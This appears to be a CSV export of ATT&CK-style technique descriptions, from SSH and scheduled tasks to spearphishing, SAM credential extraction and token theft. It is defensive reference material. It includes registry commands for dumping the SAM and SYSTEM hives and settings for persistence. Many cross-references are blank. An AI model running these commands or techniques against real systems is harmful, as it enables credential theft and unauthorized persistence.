SSH,"Adversaries may use  to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the users public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.",technique
SSH Authorized Keys,Adversaries may modify the SSH authorized_keys file to maintain persistence on a victim host. Linux distributions and macOS commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under &lt;user-home&gt;/.ssh/authorized_keys. Users may edit the systems SSH config file to modify the directives PubkeyAuthentication and RSAAuthentication to the value yes to ensure public key and RSA authentication are enabled. The SSH config file is usually located under /etc/ssh/sshd_config.Adversaries may modify SSH authorized_keys files directly with scripts or shell commands to add their own adversary-supplied public keys. This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH. ,technique
SSH Hijacking,"Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. differs from use of  because it hijacks an existing SSH session rather than creating a new session using .",technique
Scan Databases,"Before compromising a victim, adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Scanning IP Blocks,"Before compromising a victim, adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.Adversaries may scan IP blocks in order to , such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex: ).",technique
Scheduled Task,"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.The deprecated  utility could also be abused by adversaries (ex: ), though at.exe can not access tasks created with schtasks or the Control Panel.An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).",technique
Scheduled Task/Job,"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).",technique
Scheduled Transfer,"Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as  or .",technique
Screen Capture,"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as CopyFromScreen, xwd, or screencapture.",technique
Screensaver,"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. The Windows screensaver application scrnsave.scr is located in C:\Windows\System32\, and C:\Windows\sysWOW64\  on 64-bit Windows systems, along with screensavers included with base Windows installations.The following screensaver settings are stored in the Registry (HKCU\Control Panel\Desktop\) and could be manipulated to achieve persistence:* SCRNSAVE.exe - set to malicious PE path* ScreenSaveActive - set to '1' to enable the screensaver* ScreenSaverIsSecure - set to '0' to not require a password to unlock* ScreenSaveTimeout - sets user inactivity timeout before screensaver is executedAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. ",technique
Scripting,"**This technique has been deprecated. Please use  where appropriate.**Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and  but could also be in the form of command-line batch scripts.Scripts can be embedded inside Office documents as macros that can be set to execute when files used in  and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through , where adversaries will rely on macros being allowed or that the user will accept to activate them.Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",technique
Search Closed Sources,"Before compromising a victim, adversaries may search and gather information about victims from closed sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Search Engines,"Before compromising a victim, adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Search Open Technical Databases,"Before compromising a victim, adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Search Open Websites/Domains,"Before compromising a victim, adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Search Victim-Owned Websites,"Before compromising a victim, adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: ). These sites may also have details highlighting business operations and relationships.Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Security Account Manager,"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the net user command. Enumerating the SAM database requires SYSTEM level access.A number of tools can be used to retrieve the SAM file through in-memory techniques:* pwdumpx.exe* * * secretsdump.pyAlternatively, the SAM can be extracted from the Registry with Reg:* reg save HKLM\sam sam* reg save HKLM\system systemCreddump7 can then be used to process the SAM database locally to retrieve hashes.Notes: * RID 500 account is the local, built-in administrator.* RID 501 is the guest account.* User accounts start with a RID of 1,000+.",technique
Security Software Discovery,"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from  during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Example commands that can be used to obtain security software information are , reg query with , dir with , and , but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.Adversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.",technique
Security Support Provider,"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.The SSP configuration is stored in two Registry keys: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages and HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",technique
Securityd Memory,"An adversary may obtain root access (allowing them to read securityds memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the users logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc. In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apples keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.   Apples securityd utility takes the users logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the users password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password.",technique
Server,"Before compromising a victim, adversaries may buy, lease, or rent physical serversthat can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of compromising a third-party  or renting a , adversaries may opt to configure and run their own servers in support of operations.Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.",technique
Server,"Before compromising a victim, adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a  or , adversaries may compromise third-party servers in support of operations.Adversaries may also compromise web servers to support watering hole operations, as in .",technique
Server Software Component,Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.,technique
Service Execution,Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as sc.exe and . can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with  during service persistence or privilege escalation.,technique
Service Exhaustion Flood,"Adversaries may target the different network services provided by systems to conduct a DoS. Adversaries often target DNS and web services, however others have been targeted as well. Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.",technique
Service Stop,"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. Adversaries may accomplish this by disabling individual services of high importance to an organization, such as MSExchangeIS, which will make Exchange content inaccessible . In some cases, adversaries may stop or disable many or all services to render systems unusable. Services may not allow for modification of their data stores while running. Adversaries may stop services in order to conduct  or  on the data stores of services like Exchange and SQL Server.",technique
Services File Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",technique
Services Registry Permissions Weakness,"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.  Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  , or . Access to Registry keys is controlled through Access Control Lists and permissions. If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).Adversaries may also alter Registry keys associated with service failure parameters (such as FailureCommand) that may be executed in an elevated context anytime the service fails or is intentionally corrupted. ",technique
Setuid and Setgid,"An adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different users context. On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively. . Normally an application is run in the current users context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesnt need the elevated privileges.Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via ls -l. The chmod program can set these bits with via bitmasking, chmod 4777 [file] or via shorthand naming, chmod u+s [file].Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future..",technique
Shared Modules,"Adversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows  which is called from functions like CreateProcess, LoadLibrary, etc. of the Win32 API. The module loader can load DLLs:* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;    * via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);    * via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;    * via &#x3c;file name=""filename.extension"" loadFrom=""fully-qualified or relative pathname""&#x3e; in an embedded or external ""application manifest"". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.Adversaries may use this functionality as a way to execute arbitrary code on a victim system. For example, malware may execute share modules to load additional components or features.",technique
Shared Webroot,"**This technique has been deprecated and should no longer be used.**Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory   and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.This mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. ",technique
Sharepoint,"Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:* Policies, procedures, and standards* Physical / logical network diagrams* System architecture diagrams* Technical system documentation* Testing / development credentials* Work / project schedules* Source code snippets* Links to network shares and other internal resources",technique
Shortcut Modification,Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use  to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.,technique
Signed Binary Proxy Execution,Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.,technique
Signed Script Proxy Execution,Adversaries may use scripts signed with trusted certificates to proxy execution of malicious files. Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.,technique
Silver Ticket,"Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.Password hashes for target services may be obtained using  or .",technique
Social Media,"Before compromising a victim, adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victims into revealing specific information (i.e. ). Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex: ).",technique
Social Media Accounts,"Before compromising a victim, adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others. These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: ).",technique
Social Media Accounts,"Before compromising a victim, adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. ), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. A variety of methods exist for compromising social media accounts, such as gathering credentials via , purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps). Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others. Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: ).",technique
Software,"Before compromising a victim, adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).Adversaries may gather this information in various ways, such as direct collection actions via  (ex: listening ports, server banners, user agent strings) or . Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or for initial access (ex:  or ).",technique
Software Deployment Tools,"Adversaries may gain access to and use third-party software suites installed within an enterprise network, such as administration, monitoring, and deployment systems, to move laterally through the network. Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.).Access to a third-party network-wide or enterprise-wide software system may enable an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform it's intended purpose.",technique
Software Discovery,"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from  during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to .",technique
Software Packing,"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available,  but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ",technique
Source,"**This technique has been deprecated and should no longer be used.**The source command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways source /path/to/filename [arguments] or .**This technique has been deprecated and should no longer be used.** /path/to/filename [arguments]. Take note of the space after the ""."". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment.Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.",technique
Space after Filename,"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to evil.txt  (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed .Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",technique
Spearphishing Attachment,"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon  to gain execution.There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",technique
Spearphishing Attachment,"Before compromising a victim, adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:  or ) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file. The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex:  or ) to craft persuasive and believable lures.",technique
Spearphishing Link,"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging . The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to s, like OAuth tokens, in order to gain access to protected applications and information.",technique
Spearphishing Link,"Before compromising a victim, adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:  or ) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. The given website may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. From the fake website, information is gathered in web forms and sent to the attacker. Adversaries may also use information from previous reconnaissance efforts (ex:  or ) to craft persuasive and believable lures.",technique
Spearphishing Service,"Before compromising a victim, adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:  or ) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex:  or ) to craft persuasive and believable lures.",technique
Spearphishing via Service,"Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",technique
Standard Encoding,"Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.  Some data encoding systems may also result in data compression, such as gzip.",technique
Startup Items,"Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items. This is technically a deprecated technology (superseded by ), and thus the appropriate folder, /Library/StartupItems isnt guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), StartupParameters.plist, reside in the top-level directory. An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism . Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.",technique
Steal Application Access Token,"Adversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources. This can occur through social engineering and typically requires user action to grant access.Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS). OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow. An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials.  Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls. Then, they can send a link through  to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through .Adversaries have been seen targeting Gmail, Microsoft Outlook, and Yahoo Mail users.",technique
